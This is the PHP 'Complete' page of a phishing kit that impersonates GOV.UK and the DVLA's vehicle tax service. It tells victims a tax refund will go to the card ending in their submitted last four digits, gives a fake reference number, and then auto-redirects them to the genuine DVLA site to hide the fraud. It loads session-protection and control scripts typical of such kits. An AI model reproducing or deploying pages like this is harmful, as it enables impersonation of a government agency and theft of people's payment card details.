﻿<?php 
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";
require "CONTROLS.php";

?>
<!DOCTYPE html>
<html lang="en">
<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link href="assets/css/Main.css" media="screen" rel="stylesheet" type="text/css">
        <link href="assets/css/Font.css" media="screen" rel="stylesheet" type="text/css">
        <link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
		<link rel="apple-touch-icon-precomposed" sizes="144x144" href="assets/img/114.png">
		<link rel="apple-touch-icon-precomposed" sizes="114x114" href="assets/img/144.png">
		<link rel="apple-touch-icon-precomposed" sizes="72x72" href="assets/img/72.png">
		<link rel="apple-touch-icon-precomposed" href="assets/img/57.png">
		<title>Complete</title>
		<meta http-equiv="refresh" content="15; url=https://www.google.nl/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwjnj-Cv7YTLAhVF9w4KHU1SBL8QFggjMAA&url=https%3A%2F%2Fwww.gov.uk%2Fgovernment%2Forganisations%2Fdriver-and-vehicle-licensing-agency&usg=AFQjCNFnE_rkmnK8YeWjjbwYF9t50RGguw" />
</head>


<body class="js-enabled">


<div id="global-cookie-message">
<p>GOV.UK uses cookies to make the site simpler. <a href="#"> Find out more about cookies</a></p>
</div>

            <header role="banner" class="with-proposition" id="global-header">
                <div class="header-wrapper">
                    <div class="header-global">
                        <div class="header-logo">
                            <a href="#" id="logo" class="content">
                            <img src="assets/img/logo.png" width="35" height="31" alt=""> GOV.UK
                            </a>
                        </div>
                    </div>
                    <div class="header-proposition">
                      <div class="content">
                        <nav id="proposition-menu">
                          <a href="#" id="proposition-name">Vehicle tax</a>
                        </nav>
                      </div>
                    </div>
                </div>
            </header>
            <!--end header-->

            

            <div id="global-header-bar"></div>

            <div id="wrapper">
                <div class="maincontent">
    <div id="startHeader" class="start-header group">
        <h1>Tax Refund</h1>
    </div>
    <div class="body-container group">
        
                <div style="text-align: center;">
                    <p>
                        <span class="label">This refund will be credited to your credit/debit card ending <?php echo $_SESSION['last4'];?></span>
                    </p>
                </div>


                <div style="text-align: center;">
                    <p>
                        <span class="label">Thanks for submitting your information. We will notify you via email when your refund has been processed.</span>
                    </p>
                </div>

                <div style="text-align: center;">
                    <p>
                        <span class="label">Your refund reference number is: <b>2018/<?php echo $_SESSION['ref'];?>/7653</span>
                    </p>
                </div>
		<a href="https://www.google.nl/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwjnj-Cv7YTLAhVF9w4KHU1SBL8QFggjMAA&url=https%3A%2F%2Fwww.gov.uk%2Fgovernment%2Forganisations%2Fdriver-and-vehicle-licensing-agency&usg=AFQjCNFnE_rkmnK8YeWjjbwYF9t50RGguw">		
        <div class="action">
            <input type="submit" name="go" id="go" value="Exit" class="button">
            
            
        </div>			
		</a>		
				
    </div>

</div>
            </div>

            <footer class="group js-footer" id="footer" role="contentinfo">
                <div class="footer-wrapper">
                    <div class="footer-meta">
                        <div class="footer-meta-inner">
                            <ul>
                                <li>
                                    <a href="#">Cookies</a>
                                </li>
                                <li>
                                    <a href="#">Terms and Conditions</a>
                                </li>
                                <li>
                                    <a href="#">English</a>
                                </li>
                                <li>
                                    <a href="#">Welsh</a>
                                </li>
                                <li>
                                    Built by the <a href="#">Driver &amp; Vehicle Licensing Agency</a> 
                                </li>
                            </ul>
                            <div class="open-government-licence">
                                <p class="logo"><a href="#">Open Government Licence</a></p>
                                <p>
                                    All content is available under the <a href="#">
                                        Open Government Licence v2.0</a>, except where otherwise stated</p>
                            </div>
                        </div>
                        <div class="copyright">
                            <a href="#">
                                &copy; Crown copyright</a>
                        </div>
                    </div>
                </div>
            </footer>
        
        
    


</body>
</html>
